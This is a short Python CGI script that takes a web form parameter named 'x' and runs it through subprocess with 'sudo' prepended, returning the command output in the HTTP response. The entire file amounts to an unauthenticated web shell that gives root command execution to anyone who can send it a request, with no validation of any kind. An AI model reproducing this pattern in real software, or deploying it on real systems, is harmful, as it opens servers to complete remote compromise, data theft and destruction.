#!/usr/bin/python3

import cgi
import subprocess

print("content-type: text/html")
print()

f = cgi.FieldStorage()
cmd = f.getvalue("x")
output = subprocess.getoutput("sudo\t " + cmd)
print(output)
